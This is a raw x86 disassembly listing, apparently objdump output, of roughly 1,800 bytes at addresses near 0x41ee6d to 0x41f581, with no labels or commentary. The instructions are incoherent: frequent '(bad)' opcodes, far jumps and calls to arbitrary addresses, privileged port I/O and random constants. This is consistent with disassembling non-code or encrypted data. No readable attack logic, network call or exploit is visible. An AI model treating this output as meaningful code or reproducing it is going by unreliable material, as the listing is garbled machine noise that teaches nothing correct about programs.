  41ee6d:	fistp  QWORD PTR [edx-0x5d]
  41ee70:	dec    ebp
  41ee71:	push   0x14
  41ee73:	lods   al,BYTE PTR ds:[esi]
  41ee74:	mov    bl,0xc9
  41ee76:	int3   
  41ee77:	add    ecx,DWORD PTR [edi+esi*4-0x41]
  41ee7b:	xor    esp,DWORD PTR [ebp-0x7f829d3a]
  41ee81:	dec    edi
  41ee82:	xchg   ebp,eax
  41ee83:	lods   al,BYTE PTR ds:[esi]
  41ee84:	mov    esi,0xe531e9ef
  41ee89:	pop    edx
  41ee8a:	fild   DWORD PTR [ebx+0x17]
  41ee8d:	fcomp  DWORD PTR [eax+0x54]
  41ee90:	in     eax,0x42
  41ee92:	adc    eax,0xedc3a5a7
  41ee97:	adc    BYTE PTR [edi],dl
  41ee99:	add    eax,0xf6b320f
  41ee9e:	jl     0x41ee54
  41eea0:	or     al,0xcf
  41eea2:	sar    BYTE PTR [edx],0xd8
  41eea5:	test   BYTE PTR [eax],dh
  41eea7:	data16 loopne 0x41ee83
  41eeaa:	loop   0x41eedc
  41eeac:	jge    0x41eecb
  41eeae:	cmp    BYTE PTR ds:0xef2b9b5f,cl
  41eeb4:	xor    al,0x20
  41eeb6:	sar    BYTE PTR [eax+eax*1+0x4c160a02],cl
  41eebd:	(bad)  
  41eebe:	cmc    
  41eebf:	sub    edx,DWORD PTR [esi-0x51]
  41eec2:	and    ebp,DWORD PTR [edx-0x5b7b2903]
  41eec8:	test   ebp,0x3814b773
  41eece:	cmp    BYTE PTR [ebp+0x11ba65c2],ah
  41eed4:	mov    dl,0x50
  41eed6:	test   DWORD PTR [eax],esp
  41eed8:	lods   al,BYTE PTR ds:[esi]
  41eed9:	xchg   DWORD PTR [ecx-0x37ca4b96],edi
  41eedf:	(bad)  
  41eee0:	cmp    al,0x9f
  41eee2:	pop    esi
  41eee3:	ins    DWORD PTR es:[edi],dx
  41eee4:	adc    BYTE PTR [edx-0x65],al
  41eee7:	test   al,0x23
  41eee9:	xor    eax,0xcd5b9c8a
  41eeee:	mov    bh,0xd0
  41eef0:	test   al,0x46
  41eef2:	xchg   edi,eax
  41eef3:	std    
  41eef4:	call   0xc7c3:0xdc64b6bc
  41eefb:	(bad)  
  41eefc:	iret   
  41eefd:	icebp  
  41eefe:	push   ds
  41eeff:	mov    edi,0xb4084520
  41ef04:	or     al,0x14
  41ef06:	lock mov esi,DWORD PTR [eax-0x33]
  41ef0a:	call   0xa552d7a2
  41ef0f:	and    eax,0x400aedc7
  41ef14:	imul   edi,DWORD PTR [ecx-0x131b1cbf],0xffffffe9
  41ef1b:	loope  0x41eeb0
  41ef1d:	pop    ecx
  41ef1e:	imul   ebx,DWORD PTR [eax+ebp*8+0x47],0xffffffae
  41ef23:	fcmovnb st,st(6)
  41ef25:	retf   
  41ef26:	mov    eax,0xf724145f
  41ef2b:	xchg   BYTE PTR [edi],cl
  41ef2d:	loope  0x41eef2
  41ef2f:	pop    edi
  41ef30:	mov    bh,bh
  41ef32:	pop    ebx
  41ef33:	jmp    0x185db5be
  41ef38:	stos   DWORD PTR es:[edi],eax
  41ef39:	inc    edx
  41ef3a:	retf   0x536f
  41ef3d:	out    0xf0,eax
  41ef3f:	jle    0x41ef5c
  41ef41:	cs mov ebp,0x84c991c1
  41ef47:	stos   BYTE PTR es:[edi],al
  41ef48:	out    0x63,eax
  41ef4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4b:	nop
  41ef4c:	xchg   ebx,eax
  41ef4d:	data16 outs dx,BYTE PTR ds:[esi]
  41ef4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef50:	iret   
  41ef51:	pop    eax
  41ef52:	fmul   DWORD PTR [eax+0x4f5ce5ff]
  41ef58:	jbe    0x41efcc
  41ef5a:	dec    esp
  41ef5b:	xchg   edi,esi
  41ef5d:	clc    
  41ef5e:	data16 lods al,BYTE PTR ds:[esi]
  41ef60:	add    DWORD PTR [ebx],esi
  41ef62:	push   es
  41ef63:	sbb    DWORD PTR [edx-0x39],eax
  41ef66:	in     eax,dx
  41ef67:	xchg   ebx,eax
  41ef68:	aam    0x72
  41ef6a:	loopne 0x41ef11
  41ef6c:	pushf  
  41ef6d:	ins    DWORD PTR es:[edi],dx
  41ef6e:	movmskps esi,xmm5
  41ef71:	xor    ch,cl
  41ef73:	scas   eax,DWORD PTR es:[edi]
  41ef74:	cdq    
  41ef75:	and    eax,0x6e1dc9c9
  41ef7a:	or     eax,0x8778db87
  41ef7f:	xchg   ebp,ecx
  41ef81:	cmp    DWORD PTR [edx],ebx
  41ef83:	sub    eax,DWORD PTR ds:0xaccbbdd8
  41ef89:	cdq    
  41ef8a:	xchg   edx,eax
  41ef8b:	aaa    
  41ef8c:	cmp    eax,0x9ab2d874
  41ef91:	(bad)  
  41ef93:	call   0xf5ce10cc
  41ef98:	mov    eax,0xa1dbbb36
  41ef9d:	inc    ecx
  41ef9e:	imul   ebp,esp,0xffffffeb
  41efa1:	xchg   ebp,eax
  41efa2:	into   
  41efa3:	lock out 0x21,eax
  41efa6:	xor    ecx,ecx
  41efa8:	inc    eax
  41efa9:	sub    bl,ah
  41efab:	idiv   BYTE PTR [edx]
  41efad:	mov    edx,0x45ba5e84
  41efb2:	or     eax,0x22e01a43
  41efb7:	push   ebx
  41efb8:	pop    ebx
  41efb9:	sub    DWORD PTR [eax],edx
  41efbb:	mov    ebx,0x3e599da2
  41efc0:	jns    0x41f039
  41efc2:	mov    WORD PTR [edi],cs
  41efc4:	fwait
  41efc5:	mov    ds:0x59302e38,al
  41efca:	jae    0x41f042
  41efcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efcd:	adc    ah,bl
  41efcf:	jae    0x41ef8b
  41efd1:	scas   al,BYTE PTR es:[edi]
  41efd2:	mov    cl,0x13
  41efd4:	mov    bh,0xed
  41efd6:	push   esp
  41efd7:	ret    
  41efd8:	mov    ah,0x5e
  41efda:	mov    eax,0x7f798f77
  41efdf:	outs   dx,DWORD PTR ds:[esi]
  41efe0:	and    ah,dl
  41efe2:	dec    esp
  41efe3:	cmp    BYTE PTR [ebx],0x1f
  41efe6:	cmp    eax,0x6f1c688b
  41efeb:	mov    edx,DWORD PTR [ebx+eax*2]
  41efee:	xor    al,0x62
  41eff0:	mov    esp,0xbf51463c
  41eff5:	clc    
  41eff6:	push   0x15
  41eff8:	pop    ebp
  41eff9:	pop    esp
  41effa:	cld    
  41effb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41effc:	pop    ds
  41effd:	cmp    al,0x4b
  41efff:	out    dx,al
  41f000:	sub    edx,DWORD PTR [edx+0x8]
  41f003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f004:	ds jg  0x41f079
  41f007:	sub    al,0x20
  41f009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00a:	and    BYTE PTR [eax+ecx*4-0x7dba20d9],0x1c
  41f012:	fwait
  41f013:	sub    eax,0xa5f9221f
  41f018:	scas   al,BYTE PTR es:[edi]
  41f019:	cmc    
  41f01a:	out    0x6a,eax
  41f01c:	add    cl,BYTE PTR [edi-0x13]
  41f01f:	lahf   
  41f020:	inc    DWORD PTR [edx-0x748d3661]
  41f026:	sub    DWORD PTR ds:0x104a13,ecx
  41f02c:	cmp    ch,BYTE PTR [ebp-0x46]
  41f02f:	mov    bh,0xb7
  41f031:	rcr    DWORD PTR [edx-0x7b],cl
  41f034:	ins    BYTE PTR es:[edi],dx
  41f035:	mov    bh,0xa
  41f037:	frstpm(287 only) 
  41f039:	neg    al
  41f03b:	ror    BYTE PTR [edx],0x56
  41f03e:	push   esp
  41f03f:	jg     0x41efe6
  41f041:	xor    eax,DWORD PTR [edi]
  41f043:	jbe    0x41f08e
  41f045:	in     eax,0xff
  41f047:	mov    ah,0x9
  41f049:	mov    ebp,0xa95fdcb6
  41f04e:	in     al,dx
  41f04f:	fldenv [eax]
  41f051:	dec    edi
  41f052:	cdq    
  41f053:	mov    cl,0xc8
  41f055:	popa   
  41f056:	jns    0x41f0d6
  41f058:	fmulp  st(1),st
  41f05a:	sbb    eax,ebp
  41f05c:	(bad)  
  41f05d:	repnz daa 
  41f05f:	fst    DWORD PTR [edi+0x5bf8f618]
  41f065:	push   edx
  41f066:	xchg   ebp,eax
  41f067:	enter  0xccf,0xc5
  41f06b:	imul   edx,DWORD PTR [edx],0x28
  41f06e:	sbb    BYTE PTR [eax+ebp*2],bh
  41f071:	mov    bl,0x31
  41f073:	addr16 mov dl,0x5e
  41f076:	jmp    0x4ed0e35d
  41f07b:	mov    esp,0x32dd7d46
  41f080:	scas   al,BYTE PTR es:[edi]
  41f081:	jge    0x41f0db
  41f083:	pop    edx
  41f084:	fnstsw WORD PTR [ecx+edi*4+0x115666d7]
  41f08b:	nop
  41f08c:	sub    DWORD PTR [esp+ecx*8],esi
  41f08f:	or     BYTE PTR [ebx],dl
  41f091:	or     edx,DWORD PTR [esi]
  41f093:	inc    ecx
  41f094:	mov    esi,0xa876a2ff
  41f099:	mov    cs,WORD PTR [ecx+0x1c3785ca]
  41f09f:	adc    DWORD PTR [esi-0x4e],edx
  41f0a2:	aaa    
  41f0a3:	aas    
  41f0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0a5:	and    ah,cl
  41f0a7:	sbb    ebx,DWORD PTR [ebp+0x62]
  41f0aa:	ror    al,cl
  41f0ac:	sub    cl,dl
  41f0ae:	pop    ds
  41f0af:	outs   dx,DWORD PTR ds:[esi]
  41f0b0:	rcl    bh,0xab
  41f0b3:	inc    ebp
  41f0b4:	mov    dl,0xa9
  41f0b6:	(bad)  
  41f0b7:	retf   0xaa2c
  41f0ba:	stos   BYTE PTR es:[edi],al
  41f0bb:	cli    
  41f0bc:	and    ebx,edx
  41f0be:	test   eax,esp
  41f0c0:	xchg   ecx,eax
  41f0c1:	bound  esp,QWORD PTR [eax]
  41f0c3:	adc    al,0xa2
  41f0c5:	push   ebp
  41f0c6:	fdiv   QWORD PTR [ebx-0x4]
  41f0c9:	jbe    0x41f05b
  41f0cb:	hlt    
  41f0cc:	mov    bl,0x81
  41f0ce:	aas    
  41f0cf:	xor    dh,BYTE PTR [esi-0x7cff57eb]
  41f0d5:	inc    ebp
  41f0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d7:	push   edi
  41f0d8:	pushf  
  41f0d9:	sar    esi,1
  41f0db:	daa    
  41f0dc:	gs mov dl,0x2d
  41f0df:	sub    al,0x31
  41f0e1:	adc    ebp,DWORD PTR [edi-0xf4e72d2]
  41f0e7:	ret    0xb01e
  41f0ea:	inc    esi
  41f0eb:	pop    ebp
  41f0ec:	inc    ecx
  41f0ed:	dec    ebp
  41f0ee:	icebp  
  41f0ef:	xchg   edi,eax
  41f0f0:	sbb    al,0xe1
  41f0f2:	pmulhuw mm4,QWORD PTR [ecx+esi*4]
  41f0f6:	fdivp  st(0),st
  41f0f8:	ficom  DWORD PTR [eax]
  41f0fa:	mov    DWORD PTR ss:[esi-0x78e9d6eb],0x7b2871fa
  41f105:	push   es
  41f106:	lods   eax,DWORD PTR ds:[esi]
  41f107:	call   FWORD PTR [ebp+0x48]
  41f10a:	mov    dl,0x3e
  41f10c:	fwait
  41f10d:	lods   al,BYTE PTR ds:[esi]
  41f10e:	(bad)  
  41f10f:	pusha  
  41f110:	aas    
  41f111:	sbb    eax,0x4c69e2ac
  41f116:	inc    ebx
  41f117:	das    
  41f118:	popa   
  41f119:	pusha  
  41f11a:	pushf  
  41f11b:	push   ss
  41f11c:	inc    ecx
  41f11d:	and    BYTE PTR [ebp+ebx*2+0x64319b0],bl
  41f124:	mov    edi,ebp
  41f126:	icebp  
  41f127:	xlat   BYTE PTR ds:[ebx]
  41f128:	bound  ebp,QWORD PTR [edx+0x6e]
  41f12b:	mov    edi,0x2370ba88
  41f130:	jae    0x41f109
  41f132:	dec    eax
  41f133:	push   ebx
  41f134:	arpl   WORD PTR [ebp+0x3a6dc5fe],bp
  41f13a:	inc    edx
  41f13b:	sub    al,0xca
  41f13d:	dec    esp
  41f13e:	imul   esi,DWORD PTR [eax+0x279e26b2],0xbb54d6d7
  41f148:	out    0x76,eax
  41f14a:	cmp    BYTE PTR [esi],al
  41f14c:	cmc    
  41f14d:	jmp    0xf990fa81
  41f152:	mov    BYTE PTR [esi+edx*4],dl
  41f155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f156:	dec    ecx
  41f157:	js     0x41f121
  41f159:	into   
  41f15a:	ficomp DWORD PTR [edx]
  41f15c:	repnz inc esi
  41f15e:	addr16 out dx,eax
  41f160:	cmp    eax,0xba48acfb
  41f165:	mov    ah,0x55
  41f167:	std    
  41f168:	aad    0x2
  41f16a:	lods   al,BYTE PTR ds:[esi]
  41f16b:	pop    eax
  41f16c:	jo     0x41f0fe
  41f16e:	mov    dl,0xfa
  41f170:	mov    edi,DWORD PTR [esi+0x75b81e2d]
  41f176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f177:	(bad)  
  41f178:	(bad)  
  41f179:	out    dx,eax
  41f17a:	pop    eax
  41f17b:	retf   0x37bd
  41f17e:	mov    DWORD PTR [edi],edx
  41f180:	retf   
  41f181:	in     eax,dx
  41f182:	cs push ecx
  41f184:	cmp    cl,BYTE PTR ds:0x9237b3d3
  41f18a:	mov    dh,0x7a
  41f18c:	mul    BYTE PTR [ebp+0x3af53630]
  41f192:	mov    bh,0x5c
  41f194:	cwde   
  41f195:	repz dec edx
  41f197:	leave  
  41f198:	push   eax
  41f199:	dec    esi
  41f19a:	add    BYTE PTR [esi+0x4595db95],al
  41f1a0:	aas    
  41f1a1:	mov    dh,0x41
  41f1a3:	scas   al,BYTE PTR es:[edi]
  41f1a4:	cld    
  41f1a5:	push   ebx
  41f1a6:	data16 js 0x41f138
  41f1a9:	addr16 int3 
  41f1ab:	retf   
  41f1ac:	cmp    ecx,esi
  41f1ae:	(bad)  
  41f1af:	pop    ds
  41f1b0:	pushf  
  41f1b1:	cmc    
  41f1b2:	pop    esi
  41f1b3:	sahf   
  41f1b4:	lods   eax,DWORD PTR ds:[esi]
  41f1b5:	ret    0xf40a
  41f1b8:	int3   
  41f1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ba:	pop    eax
  41f1bb:	pop    ebp
  41f1bc:	push   ebp
  41f1bd:	daa    
  41f1be:	push   ebx
  41f1bf:	xor    DWORD PTR [edx-0x59667370],esi
  41f1c5:	push   ds
  41f1c6:	retf   0xd6a5
  41f1c9:	je     0x41f176
  41f1cb:	cmp    ebx,DWORD PTR [esi]
  41f1cd:	jno    0x41f1da
  41f1cf:	inc    ebp
  41f1d0:	ds inc esi
  41f1d2:	push   ecx
  41f1d3:	(bad)  
  41f1d4:	daa    
  41f1d5:	aaa    
  41f1d6:	daa    
  41f1d7:	js     0x41f1ec
  41f1d9:	iret   
  41f1da:	mov    bh,0xbc
  41f1dc:	xchg   ecx,eax
  41f1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1de:	loope  0x41f16e
  41f1e0:	in     eax,dx
  41f1e1:	dec    ebx
  41f1e2:	ja     0x41f1b7
  41f1e4:	inc    ebp
  41f1e5:	cli    
  41f1e6:	hlt    
  41f1e7:	inc    esi
  41f1e8:	cs mov ch,0x9
  41f1eb:	out    0x61,eax
  41f1ed:	stos   DWORD PTR es:[edi],eax
  41f1ee:	push   es
  41f1ef:	rcr    DWORD PTR [eax],1
  41f1f1:	inc    ebp
  41f1f2:	scas   al,BYTE PTR es:[edi]
  41f1f3:	invd   
  41f1f5:	dec    DWORD PTR ds:0x809907f3
  41f1fb:	sub    DWORD PTR [ebp+0x2d],esi
  41f1fe:	dec    edx
  41f1ff:	fmul   QWORD PTR [ebp-0x57343c95]
  41f205:	ret    0x9475
  41f208:	sbb    DWORD PTR [eax],0x7e65aae0
  41f20e:	jo     0x41f1ae
  41f210:	jecxz  0x41f1e7
  41f212:	(bad)  
  41f213:	dec    esp
  41f214:	cmp    BYTE PTR [esi],al
  41f216:	aas    
  41f217:	adc    eax,0xfe8320da
  41f21c:	out    0x56,al
  41f21e:	cld    
  41f21f:	dec    ecx
  41f220:	imul   ebp,ebp,0xffffffc6
  41f223:	fdivr  st,st(2)
  41f225:	sub    edi,0xa35c0312
  41f22b:	adc    esp,eax
  41f22d:	pop    ds
  41f22e:	sbb    DWORD PTR [eax+edx*4-0x29385baa],esp
  41f235:	sub    eax,0xd73da1ca
  41f23a:	adc    al,0x28
  41f23c:	test   edi,0xcb32cfe5
  41f242:	dec    esi
  41f243:	jmp    DWORD PTR [ebp-0x5b]
  41f246:	dec    esp
  41f247:	ja     0x41f1cf
  41f249:	aas    
  41f24a:	xchg   ecx,eax
  41f24b:	out    dx,eax
  41f24c:	cmp    eax,0xe0e3e43d
  41f251:	add    eax,DWORD PTR [esi-0x1a]
  41f254:	add    ebp,0x3b5683c7
  41f25a:	sbb    edx,0x85ea77f0
  41f260:	sbb    DWORD PTR [edx-0x30],esi
  41f263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f264:	xor    DWORD PTR ds:0x226e5d1a,esi
  41f26a:	cld    
  41f26b:	jae    0x41f250
  41f26d:	cmp    eax,0xdd3dcf88
  41f272:	iret   
  41f273:	loopne 0x41f20c
  41f275:	mov    cl,0x6e
  41f277:	mov    cl,0x77
  41f279:	pop    edi
  41f27a:	repz std 
  41f27c:	pop    ebp
  41f27d:	arpl   bx,sp
  41f27f:	pop    edx
  41f280:	xor    DWORD PTR [edi+0x47],esp
  41f283:	sti    
  41f284:	pop    edx
  41f285:	je     0x41f303
  41f287:	pop    es
  41f288:	ins    BYTE PTR es:[edi],dx
  41f289:	into   
  41f28a:	das    
  41f28b:	xor    eax,DWORD PTR [esi-0x4321d718]
  41f291:	fwait
  41f292:	jle    0x41f29f
  41f294:	fwait
  41f295:	jmp    0x4b71aff7
  41f29a:	mov    ah,0x18
  41f29c:	sti    
  41f29d:	jmp    0x41f2c2
  41f29f:	test   eax,0x38429bf6
  41f2a4:	xchg   DWORD PTR ds:0x19bc4264,edi
  41f2aa:	rcl    DWORD PTR [eax-0x7fbc76cd],1
  41f2b0:	jae    0x41f2f1
  41f2b2:	push   DWORD PTR [esi-0x33b66dd6]
  41f2b8:	in     eax,0xeb
  41f2ba:	mov    fs,WORD PTR [ecx]
  41f2bc:	xor    bh,ah
  41f2be:	xchg   ecx,eax
  41f2bf:	pop    edi
  41f2c0:	dec    eax
  41f2c1:	retf   0x632c
  41f2c4:	aaa    
  41f2c5:	or     BYTE PTR [ecx-0x4c29419e],0x3e
  41f2cc:	outs   dx,DWORD PTR ds:[esi]
  41f2cd:	adc    ecx,DWORD PTR [esi-0x6b]
  41f2d0:	jae    0x41f2bf
  41f2d2:	fisub  DWORD PTR [ebp-0x428fab61]
  41f2d8:	sub    BYTE PTR [eax],dl
  41f2da:	xchg   BYTE PTR [eax-0x7b42a32c],dl
  41f2e0:	dec    ebp
  41f2e1:	hlt    
  41f2e2:	push   edx
  41f2e3:	fcomp  DWORD PTR [edx+0x78]
  41f2e6:	pop    ebx
  41f2e8:	test   al,0x72
  41f2ea:	repz cmp al,BYTE PTR [esi+0x72]
  41f2ee:	sahf   
  41f2ef:	cmp    BYTE PTR [esi-0x6bbbe5f8],cl
  41f2f5:	pop    ecx
  41f2f6:	push   ebp
  41f2f7:	data16 sub ch,BYTE PTR [ebx+0x6cf677ef]
  41f2fe:	push   ebp
  41f2ff:	mov    ah,BYTE PTR [esp+eax*2]
  41f302:	xchg   edx,eax
  41f303:	jmp    FWORD PTR [ecx+0x3f2eef36]
  41f309:	xor    esp,DWORD PTR [edx+eax*1]
  41f30c:	mov    edx,edi
  41f30e:	ja     0x41f346
  41f310:	sub    BYTE PTR [edx],ch
  41f312:	cld    
  41f313:	ret    0x9ed7
  41f316:	rcl    DWORD PTR [edx+0x4b],0xb4
  41f31a:	jle    0x41f2a1
  41f31c:	or     DWORD PTR [eax+0x36],esp
  41f31f:	mov    ds,WORD PTR [edi]
  41f321:	jp     0x41f323
  41f323:	mov    dl,0x38
  41f325:	fidivr DWORD PTR [ecx]
  41f327:	adc    ah,BYTE PTR [eax-0x54be3c35]
  41f32d:	lock push edi
  41f32f:	push   es
  41f330:	mov    ebx,0xd094f60
  41f335:	fs inc ebp
  41f337:	xor    ebx,DWORD PTR [edi-0x60]
  41f33a:	in     al,dx
  41f33b:	mov    al,ds:0xb7f7555b
  41f340:	gs retf 0x13e5
  41f344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f345:	aam    0xc7
  41f347:	jmp    0xdfba0e8d
  41f34c:	adc    eax,0x6743efb4
  41f351:	xchg   DWORD PTR [ecx],ebp
  41f353:	clc    
  41f354:	jno    0x41f360
  41f356:	pushw  0x79
  41f359:	dec    edx
  41f35a:	lods   eax,DWORD PTR ds:[esi]
  41f35b:	ds or  ebp,ebx
  41f35e:	pop    ss
  41f35f:	mov    ds:0xe9d0e608,eax
  41f364:	mov    eax,ds:0x4e4afa09
  41f369:	(bad)  
  41f36b:	mov    eax,DWORD PTR [edx-0x46]
  41f36e:	add    eax,DWORD PTR [edx]
  41f370:	inc    esi
  41f371:	mov    bh,0x17
  41f373:	jae    0x41f3b9
  41f375:	js     0x41f3b5
  41f377:	cmp    eax,0xd1b16292
  41f37c:	out    dx,al
  41f37d:	ret    
  41f37e:	mov    gs,edx
  41f380:	sub    eax,0xdd38d593
  41f385:	xchg   esi,eax
  41f386:	jae    0x41f3d9
  41f388:	mov    ebx,0xff054e99
  41f38d:	mov    ebx,0xf0aae56
  41f392:	imul   edi,DWORD PTR [eax],0x99f2c56
  41f398:	jne    0x41f397
  41f39a:	add    BYTE PTR [edx],al
  41f39c:	loop   0x41f346
  41f39e:	lahf   
  41f39f:	xlat   BYTE PTR ds:[ebx]
  41f3a0:	and    eax,0x76f6ddd6
  41f3a5:	jne    0x41f345
  41f3a7:	mov    ah,0x2e
  41f3a9:	fs mov ecx,0xe5219982
  41f3af:	test   edx,ebx
  41f3b1:	lods   al,BYTE PTR ds:[esi]
  41f3b2:	add    ebx,DWORD PTR [edx+0x4075a65e]
  41f3b8:	pop    esi
  41f3b9:	push   ss
  41f3ba:	pop    ds
  41f3bb:	mov    al,0x6d
  41f3bd:	sahf   
  41f3be:	or     eax,0xe411cc07
  41f3c3:	cmc    
  41f3c4:	stos   DWORD PTR es:[edi],eax
  41f3c5:	mov    al,0xb6
  41f3c7:	out    0x8d,eax
  41f3c9:	and    al,0xa2
  41f3cb:	add    al,ah
  41f3cd:	inc    ebp
  41f3ce:	int    0x16
  41f3d0:	cmc    
  41f3d1:	push   ss
  41f3d2:	mov    ebp,0xb4f45c5b
  41f3d7:	mov    edx,0x782bad5b
  41f3dc:	xor    DWORD PTR [edi],eax
  41f3de:	mov    eax,0xb9a140e5
  41f3e3:	aaa    
  41f3e4:	ins    DWORD PTR es:[edi],dx
  41f3e5:	sahf   
  41f3e6:	sbb    BYTE PTR es:[ebp+0x58fb3f37],0xb0
  41f3ee:	mov    dh,0xd1
  41f3f0:	shl    DWORD PTR [ebx],cl
  41f3f2:	push   eax
  41f3f3:	mul    BYTE PTR [edi+edi*4-0x4ecc19f1]
  41f3fa:	mov    bl,BYTE PTR [ebx]
  41f3fc:	lea    ecx,[eax+0x4e]
  41f3ff:	push   edx
  41f400:	cs lahf 
  41f402:	lds    eax,FWORD PTR [esi-0x6f7b91ac]
  41f408:	sub    ah,BYTE PTR [eax]
  41f40a:	das    
  41f40b:	jmp    0x41f3a2
  41f40d:	cs pushf 
  41f40f:	or     eax,DWORD PTR [esi+eax*2]
  41f412:	fsubrp st(4),st
  41f414:	rdmsr  
  41f416:	adc    ah,BYTE PTR [esi-0x39f2757b]
  41f41c:	into   
  41f41d:	cmp    BYTE PTR [edx-0x3b05a0e4],dh
  41f423:	push   edx
  41f424:	int3   
  41f425:	add    ebp,esi
  41f427:	push   ss
  41f428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f429:	mov    edx,0xbe6f6544
  41f42e:	(bad)  
  41f42f:	das    
  41f430:	ja     0x41f457
  41f432:	(bad)  
  41f433:	retf   
  41f434:	adc    al,0x60
  41f436:	sti    
  41f437:	mov    bh,0x8c
  41f439:	xor    cl,BYTE PTR [ecx+0x3]
  41f43c:	push   ebp
  41f43d:	pop    ecx
  41f43e:	rcl    DWORD PTR [ecx-0x23],0x5a
  41f442:	push   edx
  41f443:	add    al,0x2d
  41f445:	cwde   
  41f446:	sbb    eax,0x7295c9f2
  41f44b:	fidiv  DWORD PTR [esi-0x60e90e92]
  41f451:	scas   al,BYTE PTR es:[edi]
  41f452:	jae    0x41f494
  41f454:	mov    dh,0x65
  41f456:	dec    ecx
  41f457:	mov    ecx,0xe6efc05
  41f45c:	adc    al,0x41
  41f45e:	push   eax
  41f45f:	adc    BYTE PTR [eax+0xa],cl
  41f462:	or     DWORD PTR [ecx-0x23],eax
  41f465:	sbb    ebx,DWORD PTR [edi+eiz*4+0x4b]
  41f469:	adc    eax,0xd07497bc
  41f46e:	mov    ebp,0x2c9e8b5
  41f473:	sbb    BYTE PTR [edx-0x47],cl
  41f476:	jge    0x41f4b4
  41f478:	sbb    BYTE PTR [eax+0x26],dh
  41f47b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f47c:	push   ecx
  41f47d:	pop    ss
  41f47e:	not    BYTE PTR [ebp+esi*2-0x43]
  41f482:	xchg   BYTE PTR [edi-0x35],al
  41f485:	mov    esp,0x37ba948e
  41f48a:	dec    ecx
  41f48b:	mov    al,0xf6
  41f48d:	outs   dx,DWORD PTR ds:[esi]
  41f48e:	xor    dl,BYTE PTR gs:[edx-0x6a87bafa]
  41f495:	dec    ecx
  41f496:	jns    0x41f4eb
  41f498:	mov    bl,0xd2
  41f49a:	inc    ecx
  41f49b:	cmc    
  41f49c:	test   al,0xfe
  41f49e:	fisubr DWORD PTR [edx+0x8f6f8d7]
  41f4a4:	ret    0x546
  41f4a7:	popf   
  41f4a8:	int3   
  41f4a9:	int3   
  41f4aa:	mul    BYTE PTR ds:0x8bb51a1f
  41f4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4b1:	mov    ss,WORD PTR [eax+0x7779752f]
  41f4b7:	pop    ecx
  41f4b8:	repnz (bad) 
  41f4ba:	sbb    edi,0x21
  41f4bd:	inc    eax
  41f4be:	jmp    0x3919:0xbfa7148
  41f4c5:	out    dx,eax
  41f4c6:	inc    eax
  41f4c7:	pop    ds
  41f4c8:	popf   
  41f4c9:	jb     0x41f4eb
  41f4cb:	sub    DWORD PTR [esi+0x7c],eax
  41f4ce:	mov    bh,0x2c
  41f4d0:	(bad)  
  41f4d1:	cld    
  41f4d2:	outs   dx,BYTE PTR ds:[esi]
  41f4d3:	mov    al,0x23
  41f4d5:	mov    bh,0xb4
  41f4d7:	mov    edi,0x5fbd90a3
  41f4dc:	add    ecx,esp
  41f4de:	xchg   ebp,eax
  41f4df:	mov    dl,0x56
  41f4e1:	mul    BYTE PTR [eax]
  41f4e3:	jg     0x41f4eb
  41f4e5:	dec    eax
  41f4e6:	xchg   ebp,eax
  41f4e7:	xor    edx,DWORD PTR [esi+0x13c05d33]
  41f4ed:	sahf   
  41f4ee:	int    0x50
  41f4f0:	push   es
  41f4f1:	aad    0xee
  41f4f3:	adc    BYTE PTR [esi+0x63af8f38],0xb3
  41f4fa:	pop    esp
  41f4fb:	mov    esp,0xbd8c19ea
  41f500:	arpl   WORD PTR [eax-0x3a],bp
  41f503:	gs inc esi
  41f505:	imul   edx,edi,0x34
  41f508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f509:	call   0xcdbed482
  41f50e:	fcomp  QWORD PTR [eax+0x69d459ca]
  41f514:	icebp  
  41f515:	cmp    BYTE PTR [ebx],cl
  41f517:	pop    ecx
  41f518:	mov    cl,0x71
  41f51a:	push   edx
  41f51b:	and    DWORD PTR [esi],esi
  41f51d:	mov    bh,0x9c
  41f51f:	cs jge 0x41f598
  41f522:	xchg   ebp,eax
  41f523:	stc    
  41f524:	mov    ebp,0x836a3888
  41f529:	or     eax,DWORD PTR cs:[ebx-0x2d]
  41f52d:	push   esi
  41f52e:	dec    esi
  41f52f:	mov    bl,BYTE PTR [edi+edi*4-0x7f]
  41f533:	jmp    0x5b2d:0xb8e0b63b
  41f53a:	outs   dx,DWORD PTR ds:[esi]
  41f53b:	xchg   ebp,eax
  41f53c:	out    0xbc,eax
  41f53e:	push   edi
  41f53f:	aaa    
  41f540:	jae    0x41f576
  41f542:	call   0x960b:0x3efa6fab
  41f549:	in     al,0x66
  41f54b:	mov    bl,0x81
  41f54d:	imul   esp,ebx,0xd51e0693
  41f553:	xor    DWORD PTR [esi],esp
  41f555:	cmp    al,0x7a
  41f557:	in     eax,0xac
  41f559:	or     cl,bl
  41f55b:	daa    
  41f55c:	xor    DWORD PTR [ecx],ebp
  41f55e:	pop    edx
  41f55f:	mov    BYTE PTR [esi-0x78d15b01],dl
  41f565:	xor    dl,BYTE PTR [edi+0x30]
  41f568:	int3   
  41f569:	lods   eax,DWORD PTR ds:[esi]
  41f56a:	in     al,dx
  41f56b:	xchg   sp,ax
  41f56d:	sar    BYTE PTR [ebx+0x6ed5353e],cl
  41f573:	pop    ebp
  41f574:	inc    esi
  41f575:	xchg   BYTE PTR [edi-0x7c],bl
  41f578:	mul    BYTE PTR [edi+edx*1+0x31]
  41f57c:	push   es
  41f57d:	mov    DWORD PTR [ebp+0x70],ecx
  41f580:	retf   
  41f581:	in     al,0xe8
